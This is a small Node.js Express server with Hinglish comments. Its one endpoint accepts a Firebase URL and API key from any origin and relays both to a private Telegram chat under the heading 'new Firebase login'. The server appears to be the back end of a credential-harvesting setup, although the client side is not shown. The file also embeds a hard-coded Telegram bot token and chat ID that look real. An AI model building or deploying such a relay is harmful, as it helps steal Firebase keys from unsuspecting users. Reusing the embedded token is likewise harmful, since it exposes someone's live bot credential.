const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const app = express();

app.use(express.json());
app.use(cors());

// Aapka Bot Token aur Chat ID
const TELEGRAM_BOT_TOKEN = '8783644398:AAH3ogMMQs1b5GxW2ua1edn2zr9VR63dpzo';
const TELEGRAM_CHAT_ID = '8855682217';

// Home route (Browser mein kholne par yeh dikhega)
app.get('/', (req, res) => {
    res.send('Bot Server is Running!');
});

app.post('/firebase-connected', async (req, res) => {
    try {
        const { firebaseUrI, apiKey } = req.body;

        // Telegram par message bhejne ka format
        const message = `🔔 Naya Firebase Login Hua!\n\n🔗 URL: ${firebaseUrI}\n🔑 API Key: ${apiKey}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });

        const data = await response.json();
        if (data.ok) {
            res.status(200).json({ success: true, message: 'Notification bhej di gayi hai!' });
        } else {
            res.status(500).json({ success: false, error: data.description });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server port ${PORT} par chal raha hai.`);
});
